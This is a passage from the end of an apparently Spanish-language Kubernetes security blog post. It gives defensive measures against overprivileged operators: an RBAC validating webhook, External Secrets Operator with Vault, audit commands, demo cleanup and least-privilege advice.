apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: rbac-validator
webhooks:
- name: validate.rbac.security.io
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: ["rbac.authorization.k8s.io"]
    apiVersions: ["v1"]
    resources: ["clusterroles", "roles"]
  clientConfig:
    service:
      name: rbac-validator
      namespace: security
      path: "/validate"
```

<br />

**2. Usar External Secrets Operator (ESO) en Su Lugar**

¡No almacenes secrets en el cluster en absoluto!
```elixir
apiVersion: external-secrets.io/v1beta1
kind: SecretStore
metadata:
  name: vault-backend
spec:
  provider:
    vault:
      server: "https://vault.example.com"
      path: "secret"
      auth:
        kubernetes:
          mountPath: "kubernetes"
          role: "demo"
```

<br />

**3. Auditorías de Seguridad Regulares**
```elixir
# Programar auditorías regulares
kubectl auth can-i --list --as=system:serviceaccount:operators:operador-sospechoso

# Usar herramientas como kubescape
kubescape scan framework nsa --exclude-namespaces kube-system,kube-public
```

<br />

##### **Limpieza**
Limpiemos nuestro entorno de demo:

```elixir
# Eliminar el operador malicioso
kubectl delete namespace config-monitor-system

# Eliminar el cluster kind
kind delete cluster --name security-demo
```

<br />

##### **Conclusión**
Esta demostración muestra lo fácil que es crear vulnerabilidades de seguridad a través de operadores con permisos excesivos. La parte aterradora no es el código malicioso, es lo legítimo que esto se ve desde afuera. Un controlador que monitorea ConfigMaps suena perfectamente razonable, y los permisos RBAC podrían pasar por una revisión de código.

<br />

Puntos clave:
> * **Nunca otorgues permisos amplios**, Sé específico sobre qué recursos necesita un operador
> * **Siempre revisá operadores de terceros**, Verificá sus requisitos RBAC antes de la instalación
> * **Usá Roles con namespace** en lugar de ClusterRoles cuando sea posible
> * **Implementá mecanismos de detección**, Las auditorías regulares pueden detectar estos problemas
> * **Seguí el principio de menor privilegio**, Empezá con permisos mínimos y agregá según sea necesario
> * **Considerá alternativas**, Tal vez no necesitás almacenar secrets en el cluster en absoluto

<br />

Recordá, la seguridad no se trata de prevenir todos los ataques, se trata de hacerlos lo suficientemente difíciles para que los atacantes pasen a objetivos más fáciles. Siguiendo estas prácticas, reducís significativamente tu superficie de ataque y hacés que tu cluster sea un objetivo mucho más difícil.

<br />

En el próximo artículo de esta serie de seguridad, exploraremos cómo implementar Pod Security Standards y admission controllers para prevenir que este tipo de despliegues lleguen a tu cluster.

<br />

¡Mantenete seguro, y siempre leé el RBAC antes de aplicar!
